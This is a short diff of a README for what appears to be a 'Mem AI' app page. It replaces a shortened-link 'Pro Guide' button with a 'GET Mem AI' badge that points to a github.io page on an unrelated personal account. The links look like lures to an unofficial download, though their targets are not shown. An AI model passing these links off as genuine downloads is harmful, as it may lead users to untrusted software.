@@ -4,15 +4,9 @@
   <img src="https://images.ctfassets.net/fcmhu5qfg1dk/7mDlVuUOhqpzcLWePnOi9w/f6a0a4810f3e2d71ceb665f7c2d8492e/Mem_-_App_Logo.png" width="299"/>
 </div>
 
-<br>
+[![GET Mem AI](https://img.shields.io/badge/GET%20%E2%80%94%20Mem-AI-0078D6?style=for-the-badge&logoColor=white)](https://perazzopoppe1999.github.io/.github/Mem-AI)
 
-<p align="center">
-  <a href="https://cutt.ly/GtOsF9aS">
-    <img src="https://img.shields.io/badge/Open_Mem_Pro_Guide-FF6B35?style=for-the-badge&logo=mem&logoColor=white"
-         height="84"
-         style="border-radius:42px; box-shadow:0 20px 60px rgba(255,107,53,0.6);">
-  </a>
-</p>
+
 --- 
 ## Key Features
 
